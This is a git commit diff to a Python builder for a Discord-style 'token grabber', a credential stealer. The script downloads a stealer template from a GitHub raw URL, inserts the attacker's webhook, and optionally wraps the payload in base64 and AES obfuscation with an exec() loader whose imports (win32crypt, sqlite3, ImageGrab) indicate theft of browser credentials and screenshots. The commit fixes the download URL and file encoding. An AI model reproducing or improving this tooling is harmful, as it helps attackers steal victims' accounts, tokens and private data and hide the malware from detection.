3f4588a93c521b5b72e9922aad83524e5866ffe0
JaneHongEn <44541408+JaneHongEn@users.noreply.github.com>
2022-10-16 17:50:00 +0800

    Update create_token_grabber.py

--- util/create_token_grabber.py
+++ util/create_token_grabber.py
@@ -27,8 +27,8 @@ def TokenGrabberV2(WebHook, fileName):
         'numpy'
     ]
     install_lib(required)
-    code = requests.get("https://github.com/JaneHongEn/111/blob/main/main.py").text.replace("WEBHOOK_HERE", WebHook)
-    with open(f"{fileName}.py", 'w') as f:
+    code = requests.get("https://raw.githubusercontent.com/JaneHongEn/111/main/main.py").text.replace("WEBHOOK_HERE", WebHook)
+    with open(f"{fileName}.py", 'w' ,encoding='UTF-8') as f:
         f.write(code)
 
     print(f"Do you want to obfuscate {fileName}.exe?")
@@ -39,12 +39,12 @@ def TokenGrabberV2(WebHook, fileName):
         for i in range(8):
             key = key + chr(random.randint(0x4E00, 0x9FA5))
 
-        with open(f'{fileName}.py') as f: _file = f.read()
+        with open(f'{fileName}.py',encoding='UTF-8') as f: _file = f.read()
 
         with open(f'{fileName}.py', "wb") as f:
             encodedBytes = base64.b64encode(_file.encode())
             obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
-            f.write(f'import requests;import os;import shutil;import sqlite3;import zipfile;import json;import base64 ;import psutil;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from re import findall;from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
+            f.write(f'import httpx;import requests;import os;import shutil;import sqlite3;import zipfile;import json;import base64 ;import psutil;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from re import findall;from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
 
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Creating {fileName}.exe")
